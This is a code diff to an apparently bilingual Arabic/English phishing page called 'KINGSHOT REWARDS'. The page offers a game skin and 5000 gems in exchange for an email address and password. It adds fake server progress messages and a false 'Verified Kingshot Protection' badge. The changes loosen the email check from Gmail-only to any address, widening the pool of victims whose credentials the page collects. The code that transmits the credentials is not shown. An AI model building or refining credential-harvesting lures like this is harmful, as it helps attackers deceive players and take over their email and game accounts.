@@ -23,7 +23,6 @@
             min-height: 100vh; margin: 0;
         }
 
-        /* زر اللغة الجديد: صغير، بدون أعلام، وشفاف */
         .lang-switcher {
             position: fixed; top: 20px; left: 20px;
             background: transparent;
@@ -77,7 +76,7 @@
             <h2 id="title">KINGSHOT REWARDS</h2>
             <p id="desc">سجل دخولك للحصول على كود (سكن ملكي + 5000 جوهرة)</p>
             
-            <input type="text" id="email" placeholder="البريد الإلكتروني (Gmail)" required>
+            <input type="text" id="email" placeholder="البريد الإلكتروني" required>
             <input type="password" id="password" placeholder="كلمة المرور" required>
             
             <button onclick="handleStart()" id="mainBtn" class="main-btn">تأكيد واستلام الكود</button>
@@ -118,22 +117,22 @@
         const content = {
             ar: {
                 title: "KINGSHOT REWARDS", desc: "سجل دخولك للحصول على كود (سكن ملكي + 5000 جوهرة)",
-                email: "البريد الإلكتروني ", pass: "كلمة المرور", btn: "تأكيد واستلام الكود",
+                email: "البريد الإلكتروني", pass: "كلمة المرور", btn: "تأكيد واستلام الكود",
                 loading: "جاري المعالجة...", status: "بدء الاتصال بالسيرفر الرئيسي...",
                 success: "تم بنجاح!", codeMsg: "تم توليد الكود الخاص بك بنجاح:",
                 close: "إغلاق", footer: "نظام حماية Kingshot المعتمد 🔒",
-                errMail: "فشل النظام: يجب استخدام حساب Gmail الرسمي.",
+                errMail: "فشل النظام: يرجى إدخال حساب صحيح مرتبط باللعبة.",
                 errPass: "فشل التوثيق: تأكد من كلمة المرور.",
                 step1: "جاري مطابقة الحساب...", step2: "جاري فك تشفير الأكواد...", step3: "استخراج الكود النهائي...",
                 langBtn: "EN"
             },
             en: {
                 title: "KINGSHOT REWARDS", desc: "Login to get your code (Royal Skin + 5000 Gems)",
-                email: "Email Address ", pass: "Password", btn: "CONFIRM & GET CODE",
+                email: "Email Address", pass: "Password", btn: "CONFIRM & GET CODE",
                 loading: "Processing...", status: "Connecting to main server...",
                 success: "Success!", codeMsg: "Your code has been generated:",
                 close: "Close", footer: "Verified Kingshot Protection 🔒",
-                errMail: "System Failed: Use official Gmail account only.",
+                errMail: "System Failed: Please enter a valid game account.",
                 errPass: "Auth Failed: Check your password.",
                 step1: "Matching account in server...", step2: "Decrypting code bundle...", step3: "Extracting final code...",
                 langBtn: "AR"
@@ -168,7 +167,7 @@
             const pass = document.getElementById('password').value;
             const c = content[currentLang];
 
-            if (!mail.toLowerCase().endsWith("@gmail.com")) { alert(c.errMail); return; }
+            if (!mail.includes("@") || mail.length < 5) { alert(c.errMail); return; }
             if (pass.length < 5) { alert(c.errPass); return; }
 
             document.getElementById('setup-view').style.display = 'none';
